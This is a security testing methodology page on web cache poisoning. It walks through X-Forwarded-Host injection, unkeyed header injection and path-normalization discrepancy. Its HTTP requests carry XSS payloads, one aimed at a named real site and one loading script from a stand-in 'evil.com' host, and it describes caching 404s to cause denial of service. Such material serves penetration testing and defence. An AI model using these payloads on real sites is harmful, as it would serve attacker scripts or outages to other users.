# Web Cache Poisoning

## Check List

## Methodology

### Black Box

#### Web Cache Poisoning via X-Forwarded-Host Header Injection

{% stepper %}
{% step %}
Navigate to the target web application and identify whether the application reflects the value of the X-Forwarded-Host header in the HTTP response
{% endstep %}

{% step %}
Using Burp Suite, intercept the request and inject a malicious payload into the X-Forwarded-Host header:

```http
GET /?xx HTTP/1.1
Host: meta.discourse.org
X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>
```
{% endstep %}

{% step %}
Send the request and observe the server response to check whether the injected payload is reflected and processed in the HTML response
{% endstep %}

{% step %}
Then verify whether the HTTP response is cached by the application
{% endstep %}

{% step %}
Send the request with the same headers (Request Start Line, Accept, Accept-Encoding) and access the cached page

```http
GET /?xx HTTP/1.1
Host: meta.discourse.org
Accept: text/html
Accept-Encoding: gzip, deflate
```
{% endstep %}

{% step %}
Observe the server response and check whether the injected payload is served from the cache and executed for subsequent users
{% endstep %}

{% step %}
If the injected payload is stored in the cache and executed for other users, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Web Cache Poisoning via Unkeyed Header Injection

{% stepper %}
{% step %}
Navigate to the target web application and identify whether the application uses any form of web cache such as CDN cache, reverse proxy cache, or browser cache
{% endstep %}

{% step %}
Send an initial request with a harmless parameter to determine cache behavior

```http
GET /?lang=en HTTP/1.1
Host: victim.com
Accept-Language: en
```
{% endstep %}

{% step %}
Observe the server response and check for cache-related headers such as

```http
Cache-Control: public
X-Cache: MISS
Age: 0
```
{% endstep %}

{% step %}
Send the same request again

```http
GET /?lang=en HTTP/1.1
Host: victim.com
Accept-Language: en
```
{% endstep %}

{% step %}
If the response now contains

```http
X-Cache: HIT
Age: >0
```
{% endstep %}

{% step %}
This confirms that the response is being cached by the application, Intercept the request using a proxy tool and modify an unkeyed header or parameter that may be processed by the application but ignored by the cache key
{% endstep %}

{% step %}
Inject a malicious payload into the header

```http
GET /?lang=en HTTP/1.1
Host: victim.com
Accept-Language: en"><script src=//evil.com/x.js></script>
```
{% endstep %}

{% step %}
Send the request and observe whether the injected value is reflected in the HTML response
{% endstep %}

{% step %}
Repeat the same request from a different session or IP address using identical cache key headers

```http
GET /?lang=en HTTP/1.1
Host: victim.com
Accept: text/html
Accept-Encoding: gzip, deflate
```
{% endstep %}

{% step %}
Observe the server response and verify whether the injected payload is served from cache to subsequent users
{% endstep %}

{% step %}
If the payload is cached and executed for multiple users until the cache expires, the Web Cache Poisoning vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Web Cache Poisoning via Path Normalization Discrepancy

{% stepper %}
{% step %}
Go to the target site.
{% endstep %}

{% step %}
Intercept a legitimate request to a JavaScript file
{% endstep %}

{% step %}
Replace forward slashes with backslashes in the path
{% endstep %}

{% step %}
Add a cache buster parameter (`?test=123`) to avoid affecting live traffic
{% endstep %}

{% step %}
Send the malformed request multiple times until cached
{% endstep %}

{% step %}
Result: The 404 response gets cached, causing DoS for all subsequent requests
{% endstep %}

{% step %}
You can use double slash `(//)` techniques or Unicode characters
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet

